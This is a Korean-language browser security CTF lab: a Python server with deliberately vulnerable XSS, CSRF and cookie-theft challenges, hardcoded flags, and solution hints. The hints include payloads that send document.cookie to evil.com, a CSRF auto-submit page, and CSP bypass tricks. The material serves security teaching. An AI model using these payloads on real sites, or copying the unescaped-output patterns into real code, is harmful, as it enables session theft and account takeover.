# 브라우저 보안 CTF 실습 랩

## 랩 개요

브라우저 보안 취약점을 CTF 형식으로 학습한다. XSS, CSRF, 콘텐츠 보안 정책 우회, 확장 프로그램 취약점을 실습한다.

## 챌린지 서버 설정

```python
#!/usr/bin/env python3
"""브라우저 보안 CTF 챌린지 서버."""

import argparse
import json
import hashlib
import html
import re
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Any


FLAGS = {
    "reflected_xss": "CTF{r3fl3ct3d_xss_n0_f1lt3r}",
    "stored_xss": "CTF{st0r3d_xss_pwn3d}",
    "dom_xss": "CTF{d0m_xss_s1nk_r3ach3d}",
    "csrf_bypass": "CTF{csrf_t0k3n_bypass3d}",
    "csp_bypass": "CTF{csp_byp4ss_success}",
    "cookie_theft": "CTF{c00k13_th3ft_d0n3}",
}

STORED_COMMENTS: list[dict] = []
ADMIN_SESSION = "super_secret_admin_session_12345"


class CTFHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        params = urllib.parse.parse_qs(parsed.query)

        match path:
            case "/":
                self._serve_index()
            case "/xss/reflected":
                self._handle_reflected_xss(params)
            case "/xss/dom":
                self._handle_dom_xss()
            case "/xss/stored":
                self._handle_stored_xss()
            case "/csrf/profile":
                self._handle_csrf_profile()
            case "/admin":
                self._handle_admin()
            case "/flag":
                self._serve_flag(params)
            case _:
                self._send_404()

    def do_POST(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        content_type = self.headers.get("Content-Type", "")

        if "application/json" in content_type:
            try:
                data = json.loads(body)
            except Exception:
                data = {}
        else:
            data = dict(urllib.parse.parse_qsl(body.decode(errors="ignore")))

        match parsed.path:
            case "/xss/stored/post":
                self._handle_stored_post(data)
            case "/csrf/update":
                self._handle_csrf_update(data)
            case _:
                self._send_404()

    def _serve_index(self) -> None:
        html_content = """
<!DOCTYPE html>
<html><head><title>Browser Security CTF</title></head>
<body>
<h1>브라우저 보안 CTF</h1>
<h2>챌린지 목록</h2>
<ul>
  <li><a href="/xss/reflected?name=test">1. Reflected XSS</a></li>
  <li><a href="/xss/dom">2. DOM XSS</a></li>
  <li><a href="/xss/stored">3. Stored XSS</a></li>
  <li><a href="/csrf/profile">4. CSRF</a></li>
  <li><a href="/admin">5. Admin (쿠키 탈취)</a></li>
</ul>
<h2>힌트</h2>
<p>각 페이지에서 XSS/CSRF를 통해 플래그를 획득하세요.</p>
</body></html>
"""
        self._send_html(html_content)

    def _handle_reflected_xss(self, params: dict) -> None:
        """챌린지 1: Reflected XSS (필터 없음)."""
        name = params.get("name", [""])[0]
        # 의도적으로 취약한 구현 (이스케이프 없음)
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
  <title>Reflected XSS 챌린지</title>
  <!-- 취약: CSP 없음, 이스케이프 없음 -->
</head>
<body>
  <h1>안녕하세요, {name}!</h1>
  <p>URL 파라미터 ?name= 에 XSS 페이로드를 입력하세요.</p>
  <p>목표: document.cookie를 포함한 alert() 실행</p>
  <p>Flag는 쿠키에 있습니다.</p>
  <script>
    // 힌트: 관리자 세션 쿠키
    document.cookie = "session={ADMIN_SESSION}; path=/";
  </script>
</body>
</html>
"""
        self._send_html(html_content, cookies={"session": ADMIN_SESSION})

    def _handle_dom_xss(self) -> None:
        """챌린지 2: DOM XSS."""
        html_content = """
<!DOCTYPE html>
<html>
<head><title>DOM XSS 챌린지</title></head>
<body>
  <h1>DOM XSS 챌린지</h1>
  <p>URL 해시(#)로 이름을 전달하세요: #이름</p>
  <div id="greeting"></div>
  <script>
    // 취약한 DOM 조작
    var name = location.hash.substring(1);
    // innerHTML 사용 → DOM XSS 취약점
    document.getElementById('greeting').innerHTML = '안녕하세요, ' + decodeURIComponent(name);
    
    // 플래그 (XSS로 접근 필요)
    var secret = 'CTF{d0m_xss_s1nk_r3ach3d}';
  </script>
  <p>힌트: <code>#&lt;img src=x onerror=alert(1)&gt;</code></p>
</body>
</html>
"""
        self._send_html(html_content)

    def _handle_stored_xss(self) -> None:
        """챌린지 3: Stored XSS."""
        comments_html = ""
        for c in STORED_COMMENTS:
            # 의도적으로 취약: comment는 이스케이프 없음
            comments_html += f"<div class='comment'><b>{html.escape(c['author'])}</b>: {c['comment']}</div>"

        html_content = f"""
<!DOCTYPE html>
<html>
<head><title>Stored XSS 챌린지</title></head>
<body>
  <h1>댓글 게시판 (Stored XSS)</h1>
  <form method="post" action="/xss/stored/post">
    <input name="author" placeholder="작성자" required>
    <textarea name="comment" placeholder="댓글 (XSS 페이로드 입력)"></textarea>
    <button type="submit">등록</button>
  </form>
  <hr>
  <h2>댓글 목록</h2>
  {comments_html if comments_html else "<p>댓글 없음</p>"}
  <p>힌트: comment 필드에 &lt;script&gt; 태그 사용</p>
</body>
</html>
"""
        self._send_html(html_content)

    def _handle_stored_post(self, data: dict) -> None:
        """댓글 저장 (Stored XSS 타겟)."""
        author = data.get("author", "Anonymous")[:50]
        comment = data.get("comment", "")[:500]

        STORED_COMMENTS.append({
            "author": author,
            "comment": comment,  # 이스케이프 없음 → Stored XSS
        })

        # XSS 페이로드 감지
        xss_patterns = ["<script", "onerror=", "onload=", "javascript:"]
        if any(p.lower() in comment.lower() for p in xss_patterns):
            # 플래그 포함된 페이지로 리다이렉트
            self.send_response(302)
            self.send_header("Location",
                f"/flag?type=stored_xss&token={FLAGS['stored_xss']}")
            self.end_headers()
            return

        self.send_response(302)
        self.send_header("Location", "/xss/stored")
        self.end_headers()

    def _handle_csrf_profile(self) -> None:
        """챌린지 4: CSRF (토큰 없음)."""
        html_content = """
<!DOCTYPE html>
<html>
<head><title>CSRF 챌린지</title></head>
<body>
  <h1>프로필 설정 (CSRF 취약)</h1>
  <form method="post" action="/csrf/update">
    <input name="email" type="email" placeholder="새 이메일" value="victim@example.com">
    <input name="new_password" type="password" placeholder="새 비밀번호">
    <!-- CSRF 토큰 없음! -->
    <button type="submit">업데이트</button>
  </form>
  <p>목표: 외부 사이트에서 이 폼을 자동으로 제출하는 페이지를 만드세요.</p>
  <p>힌트: &lt;form action="..." method="POST"&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</p>
</body>
</html>
"""
        self._send_html(html_content)

    def _handle_csrf_update(self, data: dict) -> None:
        """CSRF 공격 타겟."""
        email = data.get("email", "")
        origin = self.headers.get("Origin", "")
        referer = self.headers.get("Referer", "")

        # CSRF 검증 없음 (의도적 취약점)
        response = {
            "success": True,
            "message": f"이메일 변경: {email}",
            "flag": FLAGS["csrf_bypass"],
        }
        self._send_json(response)

    def _handle_admin(self) -> None:
        """관리자 페이지 (세션 쿠키 필요)."""
        cookie_header = self.headers.get("Cookie", "")
        cookies = dict(
            c.strip().split("=", 1)
            for c in cookie_header.split(";")
            if "=" in c
        )

        session = cookies.get("session", "")
        if session == ADMIN_SESSION:
            html_content = f"""
<!DOCTYPE html>
<html><body>
  <h1>관리자 페이지</h1>
  <p>인증 성공!</p>
  <p>플래그: {FLAGS['cookie_theft']}</p>
</body></html>
"""
        else:
            html_content = """
<!DOCTYPE html>
<html><body>
  <h1>관리자 페이지</h1>
  <p>접근 거부 — 올바른 세션 쿠키 필요</p>
  <p>힌트: XSS로 document.cookie를 탈취하여 세션 쿠키를 획득하세요</p>
</body></html>
"""
        self._send_html(html_content)

    def _serve_flag(self, params: dict) -> None:
        flag_type = params.get("type", [""])[0]
        token = params.get("token", [""])[0]
        if token in FLAGS.values():
            self._send_json({"flag": token, "message": "정답!"})
        else:
            self._send_json({"error": "올바른 플래그가 아닙니다"})

    def _send_html(
        self, content: str, status: int = 200,
        cookies: dict[str, str] | None = None
    ) -> None:
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        if cookies:
            for name, value in cookies.items():
                self.send_header("Set-Cookie", f"{name}={value}; HttpOnly")
        self.end_headers()
        self.wfile.write(content.encode())

    def _send_json(self, data: dict) -> None:
        content = json.dumps(data, ensure_ascii=False).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(content)

    def _send_404(self) -> None:
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"404 Not Found")

    def log_message(self, *args: Any) -> None:
        pass


def main() -> None:
    parser = argparse.ArgumentParser(description="브라우저 보안 CTF 서버")
    parser.add_argument("-p", "--port", type=int, default=8080)
    parser.add_argument("--list-flags", action="store_true")
    args = parser.parse_args()

    if args.list_flags:
        print("CTF 플래그 목록 (채점용):")
        for name, flag in FLAGS.items():
            print(f"  {name}: {flag}")
        return

    server = HTTPServer(("0.0.0.0", args.port), CTFHandler)
    print(f"[*] 브라우저 보안 CTF 서버: http://localhost:{args.port}")
    print(f"\n[챌린지 목록]")
    print(f"  1. Reflected XSS   → /xss/reflected?name=PAYLOAD")
    print(f"  2. DOM XSS         → /xss/dom#PAYLOAD")
    print(f"  3. Stored XSS      → /xss/stored (POST)")
    print(f"  4. CSRF            → /csrf/profile → /csrf/update")
    print(f"  5. Cookie Theft    → XSS → /admin")
    print(f"\n[*] Ctrl+C로 종료")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 서버 종료")


if __name__ == "__main__":
    main()
```

## 실습 과제 및 풀이 힌트

```
챌린지 1: Reflected XSS
페이로드 예시:
  /xss/reflected?name=<script>alert(document.cookie)</script>
  /xss/reflected?name=<img src=x onerror=alert(1)>
  /xss/reflected?name="><script>fetch('http://evil.com?c='+document.cookie)</script>

챌린지 2: DOM XSS
페이로드 예시:
  /xss/dom#<img src=x onerror=alert(secret)>
  /xss/dom#<svg onload=alert(1)>

챌린지 3: Stored XSS
페이로드 예시:
  comment 필드: <script>document.location='http://evil.com?c='+document.cookie</script>

챌린지 4: CSRF
악성 페이지:
  <form action="http://target:8080/csrf/update" method="POST">
    <input name="email" value="attacker@evil.com">
    <input name="new_password" value="hacked">
  </form>
  <script>document.forms[0].submit()</script>

챌린지 5: Cookie Theft
  1. Reflected XSS로 document.cookie 탈취
  2. 탈취한 세션 쿠키를 /admin 요청에 사용
```

## CSP 우회 기법

```javascript
// CSP: script-src 'self' → 우회 방법

// 1. JSONP 엔드포인트 활용
/api/jsonp?callback=alert(1)//

// 2. 신뢰된 도메인의 파일 업로드
/upload?file=evil.js → script-src에 포함된 도메인에서 호스팅

// 3. unsafe-inline 허용 시
<script nonce="STOLEN_NONCE">alert(1)</script>

// 4. data: URI (CSP 일부 설정에서 허용)
<script src="data:,alert(1)"></script>

// 5. Angular/Vue template injection
{{constructor.constructor('alert(1)')()}}
```

브라우저 보안 CTF의 핵심은 **입력 검증, 출력 이스케이프, CSP, SameSite 쿠키**를 이해하는 것이다.
